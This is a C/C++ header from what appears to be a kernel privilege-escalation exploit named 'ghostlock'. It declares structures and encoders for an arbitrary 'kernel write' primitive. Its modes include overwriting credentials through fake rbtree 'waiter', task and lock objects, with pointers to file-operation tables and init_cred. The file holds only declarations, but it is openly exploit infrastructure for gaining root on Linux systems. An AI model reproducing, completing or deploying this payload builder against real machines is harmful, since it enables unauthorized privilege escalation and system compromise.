#ifndef PAYLOAD_BUILDER_H
#define PAYLOAD_BUILDER_H

#include <stddef.h>
#include <stdint.h>


#include <cstddef>
#include <cstdint>
#include <span>
#include <type_traits>

namespace ghostlock {

/* Immutable description of one kernel write. `preserve_child` selects the
 * one-child erase layout; false selects the leaf/zero layout. */
enum class WriteMode : int {
  Disabled = 0,
  Zero = 1,
  Credential = 2,
};

struct WriteRequest final {
  std::uintptr_t target = 0;
  WriteMode mode = WriteMode::Disabled;
  bool preserve_child = false;

  [[nodiscard]] static constexpr WriteRequest make(std::uintptr_t target,
                                                   WriteMode mode,
                                                   bool leaf) noexcept {
    return WriteRequest{target, mode, !leaf};
  }
};

struct PayloadWriteLayout final {
  std::uintptr_t parent = 0;
  std::uintptr_t right = 0;
  std::uintptr_t left = 0;
  std::uintptr_t fops = 0;
  bool needs_credential_copy = false;
};

static_assert(std::is_standard_layout_v<WriteRequest>);
static_assert(std::is_trivially_copyable_v<WriteRequest>);
static_assert(offsetof(WriteRequest, target) == 0);
static_assert(offsetof(WriteRequest, mode) == sizeof(std::uintptr_t));
static_assert(std::is_standard_layout_v<PayloadWriteLayout>);
static_assert(std::is_trivially_copyable_v<PayloadWriteLayout>);

/* Fixed payload fragment sizes shared by the encoders and their callers. */
inline constexpr std::size_t kCompactWaiterBytes = 0x30;

/* Bounds-checked encoders. They return false without modifying memory when
 * the destination cannot contain every field required by the layout. */
[[nodiscard]] bool encode_compact_waiter(
    std::span<std::byte> waiter, const WriteRequest &request,
    const PayloadWriteLayout &layout) noexcept;
[[nodiscard]] bool encode_multicast_waiter(
    std::span<std::byte> buffer, std::size_t waiter_offset,
    std::size_t task_offset, std::size_t lock_offset, std::uintptr_t fake_task,
    std::uintptr_t fake_lock) noexcept;

}  // namespace ghostlock

using WriteRequest = ghostlock::WriteRequest;
using WriteMode = ghostlock::WriteMode;
using PayloadWriteLayout = ghostlock::PayloadWriteLayout;


/* Resolve the request-dependent words shared by the three route encoders. */
PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias);

/* Encode the route-neutral compact waiter write arm. Value writes always use
 * {pc=value,right=0,left=target}; leaf writes use {pc=target-8,0,0}. */
void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout);

int payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout);

int payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout);

void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock);

/* Fixed request/layout vectors, including the upstream unified compact arm. */
int payload_builder_fixed_vector_test(void);

#endif
